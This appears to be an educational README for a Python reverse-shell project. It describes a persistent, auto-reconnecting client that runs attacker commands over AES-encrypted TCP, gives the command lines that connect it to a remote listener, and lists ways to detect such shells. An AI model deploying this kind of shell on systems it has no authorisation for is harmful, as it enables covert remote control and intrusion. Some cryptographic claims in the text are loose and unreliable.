# PROJECT #5 - REVERSE SHELL 🔒

## Overview

A **reverse shell** is a remote command execution tool used in authorized penetration testing. Instead of you connecting to a target machine, the target machine connects back to you (hence "reverse"). This project demonstrates how reverse shells work using encrypted TCP communication.

**Educational Purpose:** Understanding post-exploitation techniques and network security concepts.

---

## How It Works: The Big Picture

```
┌─────────────────────┐                         ┌─────────────────────┐
│  VICTIM MACHINE     │                         │  ATTACKER MACHINE   │
│  (Infected)         │                         │  (Control Center)   │
├─────────────────────┤                         ├─────────────────────┤
│ client.py           │    TCP Connection       │ listener.py         │
│ (Payload)           │◄──────────────────────►│ (C&C Server)        │
│                     │    Encrypted Commands   │                     │
│ • Runs continuously │    & Responses          │ • Listens for       │
│ • Executes commands │                         │   connections       │
│ • Sends output back │                         │ • Sends commands    │
│                     │                         │ • Displays output   │
└─────────────────────┘                         └─────────────────────┘
       (Port 4444 - Encrypted)
```

---

## Component Breakdown

### 1. **CLIENT (client.py) - Victim Side**

The payload deployed on the compromised machine.

#### What it does:
- Attempts to connect to the listener every 5 seconds
- Maintains persistent connection using a loop
- Executes shell commands sent by the attacker
- Encrypts command output before sending back
- Manages directory state (remembers current working directory)

#### Key Features:
```
Auto-Reconnection:
  └─ Attempts connection every 5 seconds
  └─ If connection fails, waits and retries
  └─ No manual intervention needed on victim side

Command Execution:
  └─ Uses Python's subprocess module
  └─ Supports shell features (pipes, redirects, builtins)
  └─ 30-second timeout to prevent hanging commands
  └─ Handles Windows & Unix-like systems

Directory State:
  └─ Special handling for 'cd' command
  └─ Changes persist across multiple commands
  └─ Without this, 'cd' would only affect one command
```

#### Execution Flow:
```
1. Derive encryption key from passphrase
2. Initialize current working directory
3. LOOP (infinite):
   a. Try to connect to listener IP:port
   b. Send current directory as first message
   c. INNER LOOP:
      - Receive encrypted command
      - Decrypt it
      - If 'exit': close connection and exit
      - Execute command in current directory
      - Update directory if 'cd' was used
      - Encrypt response
      - Send response back
   d. On connection error: wait 5 seconds, go back to step 3a
```

### 2. **LISTENER (listener.py) - Attacker Side**

The command & control server that receives connections.

#### What it does:
- Binds to a TCP port and waits for incoming connections
- Accepts encrypted commands from user input
- Sends commands to the connected client
- Decrypts and displays command output
- Manages interactive shell session

#### Key Features:
```
Connection Management:
  └─ Listens on configurable host:port
  └─ Accepts one connection at a time
  └─ Displays client IP and connection timestamp
  └─ Handles disconnections gracefully

Interactive Command Prompt:
  └─ Shows client's current working directory
  └─ Color-coded output for readability
  └─ Timestamp on each connection event
  └─ Special commands:
      • 'exit': Terminates the client
      • Ctrl+C: Disconnects current session

Output Formatting:
  └─ Command output wrapped in boxes
  └─ Clear separation between commands
  └─ Directory updates reflected in prompt
```

#### Execution Flow:
```
1. Derive encryption key from passphrase
2. Bind socket to host:port
3. Listen for incoming connections
4. On connection accepted:
   a. Receive initial directory (prompt info)
   b. Display connection message with client IP
   c. SHELL LOOP:
      - Display prompt with directory
      - Get command from user input
      - Encrypt command
      - Send to client
      - If 'exit': close connection
      - Receive encrypted response
      - Decrypt response
      - Extract new directory (first line)
      - Display command output
   d. On disconnection: go back to step 4
5. Repeat until Ctrl+C pressed
```

---

## Encryption: The Security Layer

All communication is encrypted with **AES-256-CBC**. Let's break it down:

### Cryptographic Stack
```
┌────────────────────────────────────┐
│   PLAINTEXT (e.g., "whoami")       │
└────────────────────────────────────┘
              ↓
┌────────────────────────────────────┐
│  PADDING (PKCS7)                   │
│  Adds bytes to make block-aligned  │
└────────────────────────────────────┘
              ↓
┌────────────────────────────────────┐
│  KEY DERIVATION (PBKDF2)           │
│  • Input: passphrase               │
│  • Salt: "project5salt99"          │
│  • Iterations: 100,000 (slow!)     │
│  • Output: 32-byte key (256-bit)   │
└────────────────────────────────────┘
              ↓
┌────────────────────────────────────┐
│  RANDOM IV GENERATION              │
│  • 16 random bytes                 │
│  • Different for every message     │
│  • Prevents pattern detection      │
└────────────────────────────────────┘
              ↓
┌────────────────────────────────────┐
│  AES-256-CBC ENCRYPTION            │
│  • Block size: 128 bits (16 bytes) │
│  • Mode: Cipher Block Chaining     │
│  • Key: 256 bits (32 bytes)        │
│  • IV: 128 bits (16 bytes)         │
└────────────────────────────────────┘
              ↓
┌────────────────────────────────────┐
│  FRAMING (for transmission)        │
│  • 4-byte length header (big-endian)│
│  • Followed by: IV + Ciphertext    │
└────────────────────────────────────┘
              ↓
┌────────────────────────────────────┐
│  CIPHERTEXT (sent over TCP)        │
│  (Unreadable without key)          │
└────────────────────────────────────┘
```

### Why This Design?

| Component | Purpose |
|-----------|---------|
| **AES-256** | Military-grade encryption; computationally secure |
| **CBC Mode** | Chains blocks together; prevents pattern recognition |
| **Random IV** | Each message looks different; prevents replay attacks |
| **PBKDF2** | Key stretching; resists brute-force attacks (slow) |
| **100k iterations** | Makes passphrase guessing expensive (time-consuming) |

### Important Note on Security
This is educational-level encryption. For production systems:
- Use TLS/SSL (certificates, proper key exchange)
- Implement mutual authentication
- Add integrity checking (HMAC)
- Rotate keys periodically
- Use ephemeral keys (Diffie-Hellman)

---

## Data Flow Example: Running "whoami"

```
ATTACKER SIDE (listener.py)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
User types: whoami
    ↓
Encrypt("whoami") = [random IV][AES-encrypted data]
    ↓
Frame it = [4-byte length][encrypted data]
    ↓
Send over TCP to 192.168.1.5:4444
    ↓
                  (network)
                     ↓

VICTIM SIDE (client.py)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Receive [4-byte length][encrypted data]
    ↓
Extract length & data
    ↓
Decrypt using shared key = "whoami"
    ↓
Execute: subprocess.run("whoami", shell=True, cwd="/home/victim")
    ↓
Capture output: "victim_user"
    ↓
Encrypt("/home/victim\nvictim_user") = [random IV][encrypted]
    ↓
Frame it = [4-byte length][encrypted data]
    ↓
Send over TCP
    ↓
                  (network)
                     ↓

ATTACKER SIDE (listener.py)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Receive [4-byte length][encrypted data]
    ↓
Extract length & data
    ↓
Decrypt = "/home/victim\nvictim_user"
    ↓
Split on first newline:
  • New prompt: "/home/victim"
  • Output: "victim_user"
    ↓
Display:
  shell@192.168.1.5 [/home/victim]> whoami
  ┌─ output ─────────────────
  │ victim_user
  └───────────────────────────
    ↓
Ready for next command
```

---

## Important Security Limitations ⚠️

### What This Project Does NOT Have:
- **TLS/SSL**: Uses raw TCP (visible to network monitoring)
- **Authentication**: No verification that the client is legit
- **Integrity Checking**: Can't detect if messages were tampered with
- **Key Exchange**: Key is just derived from a shared passphrase
- **Forward Secrecy**: If key is compromised, all past traffic can be decrypted

### How To Detect a Reverse Shell:
```
Network Layer:
  ✓ IDS/IPS rules for repeated outbound connections to same IP
  ✓ Egress filtering (block suspicious outbound ports)
  ✓ DLP (Data Loss Prevention) for unusual data flows
  ✓ NetFlow analysis (connection patterns)

Host Level:
  ✓ Process monitoring (suspicious subprocess creation)
  ✓ File integrity checking (new executable files)
  ✓ System auditing (command execution logging)
  ✓ Antivirus/EDR detection

Traffic Analysis:
  ✓ Packet size patterns (encrypted vs normal traffic)
  ✓ Connection timing (every 5 seconds = anomalous)
  ✓ Behavioral analysis (unusual command patterns)
```

---

## Usage Guide

### Prerequisites
```bash
pip install cryptography
```

### Terminal 1: Start Listener (Your Machine)
```bash
# Default (port 4444, passphrase "ultraprohacker")
python3 listener.py

# Custom configuration
python3 listener.py --host 0.0.0.0 --port 9999 --passphrase mysecret123
```

Output:
```
  ╔══════════════════════════════════════════════════════╗
  ║   PROJECT #5 · REVERSE SHELL — LISTENER              ║
  ╚══════════════════════════════════════════════════════╝

  ⚠  For authorised lab / pentest use only.

  Listening on 0.0.0.0:4444  AES-256-CBC  passphrase=ultraprohacker
  Waiting for reverse connection …
```

### Terminal 2: Start Client (Another Machine or Same)
```bash
# Connect to localhost
python3 client.py --ip 127.0.0.1 --port 4444

# Connect to remote listener
python3 client.py --ip 192.168.1.100 --port 4444 --passphrase mysecret123
```

Output:
```
  ⚠  Project #5 — Reverse Shell Client (Educational)
  Connecting to 127.0.0.1:4444 every 5s until successful …
  Authorised lab use only.
```

### Once Connected: Interactive Shell
```
[14:30:45] ✔ Shell connected from 127.0.0.1:54321
Type commands below. Special: 'exit' kills client, Ctrl+C disconnects.

shell@127.0.0.1 [/home/user]> whoami
┌─ output ───────────────────────────────────────
│ user
└────────────────────────────────────────────────

shell@127.0.0.1 [/home/user]> cd /tmp
[cd] → /tmp

shell@127.0.0.1 [/tmp]> ls -la
┌─ output ───────────────────────────────────────
│ total 48
│ drwxrwxrwt 12 root root 4096 Jun  4 14:30 .
│ ...
└────────────────────────────────────────────────

shell@127.0.0.1 [/tmp]> exit
[*] Exit command sent.

[14:32:15] Connection from 127.0.0.1 closed. Waiting for next …
```

---

## Architecture Diagram

```
┌──────────────────────────────────────────────────────────────┐
│                      NETWORK LAYER                           │
│                  (TCP Port 4444, Encrypted)                  │
│                                                               │
│  ┌─ Length Header ─┬─ Initialization Vector ─┬─ Ciphertext  │
│  │  (4 bytes)      │     (16 bytes random)    │  (variable)  │
│  └─────────────────┴──────────────────────────┴──────────────┘
│
├─────────────────────────────────────────────────────────────┤
│
│  CLIENT (Victim)                  LISTENER (Attacker)
│  ════════════════                 ═══════════════════
│
│  ┌──────────────────┐             ┌──────────────────┐
│  │  Socket Layer    │             │  Socket Layer    │
│  │  (TCP Client)    │◄────────────│  (TCP Server)    │
│  └──────────────────┘             └──────────────────┘
│           ↕                               ↕
│  ┌──────────────────┐             ┌──────────────────┐
│  │  Encryption      │             │  Decryption      │
│  │  (AES-256-CBC)   │             │  (AES-256-CBC)   │
│  └──────────────────┘             └──────────────────┘
│           ↕                               ↕
│  ┌──────────────────┐             ┌──────────────────┐
│  │  Message Handler │             │  Input Loop      │
│  │  (recv/send)     │             │  (user input)    │
│  └──────────────────┘             └──────────────────┘
│           ↕                               ↕
│  ┌──────────────────┐             ┌──────────────────┐
│  │  Shell Executor  │             │  Output Display  │
│  │  (subprocess)    │             │  (formatting)    │
│  └──────────────────┘             └──────────────────┘
│           ↕                               ↕
│  ┌──────────────────┐             ┌──────────────────┐
│  │  Current Dir     │             │  Session State   │
│  │  Management      │             │  (directory)     │
│  └──────────────────┘             └──────────────────┘
│
└──────────────────────────────────────────────────────────────┘
```

---

## Key Takeaways

1. **Reverse shells flip the connection model**: Target initiates, attacker receives
2. **Encryption protects traffic**: AES-256-CBC prevents eavesdropping
3. **Auto-reconnection provides persistence**: Survives network interruptions
4. **Directory state is critical**: Without it, each command runs in a new shell
5. **Simple yet effective**: 200 lines of code demonstrates complex concepts
6. **Detection is possible**: Network and host monitoring can catch this

---

## Learning Resources

- **Cryptography**: `cryptography` library documentation
- **Networking**: Python `socket` module
- **Process Management**: Python `subprocess` module
- **Encryption Modes**: Understanding CBC, GCM, and other modes
- **Post-Exploitation**: OWASP resources on privilege escalation

---

## Ethical Reminder ⚠️

This tool is for **educational purposes in authorized environments only**:
- ✅ Use in your own lab
- ✅ Use with explicit written permission in pentest engagement
- ✅ Use to learn security concepts
- ❌ Do NOT use against systems you don't own
- ❌ Do NOT use for unauthorized access
- ❌ Do NOT use to cause harm

Unauthorized access to computer systems is illegal worldwide.

---

**Version**: Project #5 from 100 Ethical Hacking Projects Series
**Created**: Educational demonstration of reverse shell techniques
